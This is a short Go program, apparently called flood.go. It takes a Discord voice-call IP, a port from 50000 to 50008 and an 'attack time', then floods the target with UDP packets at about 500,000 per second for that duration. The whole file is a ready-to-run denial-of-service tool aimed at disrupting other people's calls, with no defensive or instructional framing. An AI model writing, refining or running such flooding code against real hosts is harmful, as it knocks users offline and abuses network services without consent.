package main

import (
    "fmt"
    "net"
    "os"
    "strconv"
    "time"
)

func main() {
    if len(os.Args) != 4 {
        fmt.Println("Usage: go run flood.go <discord call IP> <discord call port(50000-50008) <attack time>")
        return
    }

    dstIP := net.ParseIP(os.Args[1])
    if dstIP == nil {
        fmt.Println("Invalid IP address")
        return
    }

    dstPort, err := strconv.Atoi(os.Args[2])
    if err != nil {
        fmt.Println("Invalid port")
        return
    }

    srcIP := net.IPv4(0, 0, 0, 0)
    srcPort := 0

    conn, err := net.DialUDP("udp", &net.UDPAddr{IP: srcIP, Port: srcPort}, &net.UDPAddr{IP: dstIP, Port: dstPort})
    if err != nil {
        fmt.Println("Error:", err)
        return
    }
    defer conn.Close()

    data := []byte{0x13, 0x37, 0xca, 0xfe, 0x01, 0x00, 0x00, 0x00}

    duration, err := strconv.Atoi(os.Args[3])
    if err != nil {
        fmt.Println("Invalid duration")
        return
    }

    packetsPerSecond := 500000
    interval := time.Duration(1000000/packetsPerSecond) * time.Microsecond
    ticker := time.NewTicker(interval)

    stop := time.NewTimer(time.Duration(duration) * time.Second)

    counter := 0
    for {
        select {
        case <-ticker.C:
            _, err := conn.Write(data)
            if err != nil {
                fmt.Println("Error:", err)
                return
            }
            counter++
            if counter >= duration*packetsPerSecond {
                fmt.Println("Sent", duration*packetsPerSecond, "packets to", dstIP.String(), ":", dstPort)
                return
            }
        case <-stop.C:
            fmt.Println("Stopping after", duration, "seconds")
            return
        }
    }
}
